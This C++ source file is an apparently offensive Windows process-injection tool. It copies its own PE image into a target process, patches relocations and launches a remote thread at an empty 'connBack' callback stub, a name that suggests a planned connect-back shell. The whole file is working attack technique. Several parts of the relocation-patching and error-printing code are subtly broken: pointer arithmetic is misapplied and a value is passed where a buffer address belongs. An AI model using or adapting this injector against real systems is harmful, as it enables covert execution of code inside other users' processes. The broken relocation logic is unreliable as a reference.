#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <winternl.h>

using namespace std;

const char* ok = "[+]";
const char* info = "[*]";
const char* err = "[-]";

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


void connBack(){
    //do stuff
}

int main(int argc, char* argv[]){
    if(argc != 2){
        printf("%s Usage: %s <PID>", err, argv[0]);
        return EXIT_FAILURE;
    }

    DWORD pid = atoi(argv[1]);

    //Headers and base image of current process
    PVOID sourceImageAddress = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER sourceDOSHeader = (PIMAGE_DOS_HEADER)sourceImageAddress;
    PIMAGE_NT_HEADERS64 sourceNTHeaders64 = (PIMAGE_NT_HEADERS64)((DWORD_PTR)sourceImageAddress + sourceDOSHeader->e_lfanew);
    DWORD sourceImageSize = sourceNTHeaders64->OptionalHeader.SizeOfImage;

    printf("\n%s Trying to get handle to remote process\n", info);
    HANDLE hRemote = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (hRemote == NULL){
        printf("\n%s Cannot get the handle to the process\n", err);
        return EXIT_FAILURE;
    }
    printf("%s Handle to remote process obtained\n", ok);

    printf("\n%s Trying to allocate memory in remote process\n", info);
    LPVOID bAddress = VirtualAllocEx(hRemote, NULL, sourceImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(bAddress == NULL){
        printf("%s Cannot allocate memory for the shellcode\n", err);
        return EXIT_FAILURE;
    }
    printf("%s Memory allocated sucessfully\n", ok);

    printf("\n%s Trying to write memory in remote process\n", info);
    if(WriteProcessMemory(hRemote, bAddress, sourceImageAddress, sourceNTHeaders64->OptionalHeader.SizeOfImage, NULL) == 0){
        printf("%s Cannot write on memory, error %s\n", err, GetLastError());
        return EXIT_FAILURE;
    }
    printf("%s Memory written succesfully\n", ok);

    DWORD_PTR delta = (DWORD_PTR)bAddress - (DWORD_PTR)sourceImageAddress;

    PIMAGE_BASE_RELOCATION relocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)sourceImageAddress + sourceNTHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    DWORD relocTableEntries = 0;
    PBASE_RELOCATION_ENTRY relocationEntries = NULL;

    if(delta != 0){
        printf("\n%s Patching relocation table\n", info);
        while (relocTable->SizeOfBlock > 0 ){
            relocTableEntries = (relocTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
            relocationEntries = (PBASE_RELOCATION_ENTRY)(relocTable + sizeof(IMAGE_BASE_RELOCATION));

            for(short i = 0; i < relocTableEntries; i++){
                if(relocationEntries[i].Offset != 0){
                    PDWORD_PTR pEntryValue = (PDWORD_PTR)((DWORD_PTR)sourceImageAddress + relocTable->VirtualAddress + relocationEntries[i].Offset);
                    if(relocationEntries[i].Type == IMAGE_REL_BASED_DIR64){
                        WriteProcessMemory(hRemote, pEntryValue + delta, (LPCVOID)(*pEntryValue + delta), sizeof(LPCVOID), 0);  
                    }
                }
            }
            relocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocTable + relocTable->SizeOfBlock);
        }
        printf("%s Relocation table patched\n", ok);
    }

    printf("\n%s Trying to execute remote thread\n", info);
    HANDLE hThread = CreateRemoteThread(hRemote, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)connBack + delta), NULL, 0, NULL);
    if(hThread == NULL){
        printf("%s Cannot create remote Thread\n", err);
        return EXIT_FAILURE;
    }
    printf("%s Remote thread executed succesfully\n", ok);

    CloseHandle(hRemote);
    CloseHandle(hThread);

    return EXIT_SUCCESS;
}